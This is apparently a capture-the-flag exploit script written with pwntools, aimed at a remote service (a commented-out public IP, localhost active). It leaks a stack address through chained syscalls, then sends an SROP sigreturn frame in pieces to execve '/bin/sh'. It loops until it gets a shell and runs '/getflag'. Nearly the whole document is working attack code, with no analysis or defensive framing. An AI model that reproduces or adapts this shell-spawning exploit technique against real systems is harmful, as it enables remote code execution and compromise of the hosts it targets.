from pwn import *
import sys

context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

while True:
    #io = remote('34.81.158.137', 9488)
    io = remote('127.0.0.1', 9488)

    try:
        payload1 = p64(0x401005) + p64(0x401002) + p64(0x401000)
        payload1 = payload1.ljust(0x2c, b'\0') # sendto -> rax becomes # of bytes to send
        io.wait(2)
        io.send(payload1)

        stack_leak = io.recv(0x60) # now rax = 1 -> write(0, buf, 0x60)

        # leak stack address
        stack_addr = u64(stack_leak[0x30:0x38]) - 0xd1e # guessed offset.

        log.info('Stack address leak: ' + hex(stack_addr))

        payload3 = p64(0x401002) + p64(0x401001) + p64(stack_addr)
        payload3 += p64(0x401002) + p64(0x401001) + p64(stack_addr + 0x60)
        payload3 += p64(0x401002) + p64(0x401001) + p64(stack_addr + 0x60 * 2)
        payload3 += p64(0x401002) + p64(0x401000)
        io.wait(2)
        payload3 = payload3.ljust(0x60, b'\0') # rax = 0x60 -> gettimeofday -> return value is 0 -> next syscall becomes read again
        #pause()
        io.send(payload3)

        # SROP
        # system("/bin/sh", NULL, NULL)
        sigframe = SigreturnFrame()
        sigframe.rax = 0x3b
        sigframe.rdi = stack_addr - 0x20000
        sigframe.rsi = 0
        sigframe.rdx = 0
        sigframe.rsp = stack_addr - 0x10000
        sigframe.rip = 0x401005
        sigframe = bytes(sigframe)

        log.info('Writing SROP payload')

        payload4 = sigframe[0x0 : 0x60]
        io.wait(2)
        #pause()
        io.send(payload4)

        payload5 = sigframe[0x60 : 0x60 * 2]
        io.wait(2)
        #pause()
        io.send(payload5)

        payload6 = sigframe[0x60 * 2 : 0x60 * 3]
        payload6 = payload6.ljust(0x60, b'\0')
        io.wait(2)
        #pause()
        io.send(payload6)

        payload7 = p64(0x401002) + p64(0x401001) + p64(stack_addr - 0x20000) + p64(0x401005)
        payload7 = payload7.ljust(0x60, b'\0') # gettimeofday -> rax becomes 0
        io.wait(2)
        #pause()
        io.send(payload7)

        payload8 = b'/bin/sh'.ljust(0xf, b'\0')
        io.wait(2)
        #pause()
        io.send(payload8)

        io.wait(2)

        io.sendline('/getflag') # Test if the offset is guessed correctly and a shell is spawned

        log.success('Succeeded. Flag = ' + io.recvlineS(timeout = 2))

        io.close()
        sys.exit(0)

    except EOFError:

        log.failure('Failed. Try again')

        io.close()
